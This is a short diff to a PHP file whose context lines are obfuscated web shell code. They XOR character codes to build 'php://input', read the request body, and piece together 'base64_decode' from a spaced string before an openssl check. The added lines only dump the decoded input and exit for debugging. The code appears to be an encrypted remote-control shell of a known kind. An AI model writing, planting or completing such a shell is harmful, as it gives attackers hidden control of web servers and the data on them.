@@ -27,6 +27,10 @@ $p='|||||||||||'^chr(12).chr(20).chr(12).chr(70).chr(83).chr(83).chr(21).chr(18)
 //file_get_content(php://input)
 $HA1VG=$f($p);
 
+//test debug
+var_dump($HA1VG);
+exit;
+
 //if openssl isn't loaded
 if(!extension_loaded('openssl')){
 	$t=preg_filter('/\s+/','','base 64 _ deco de');
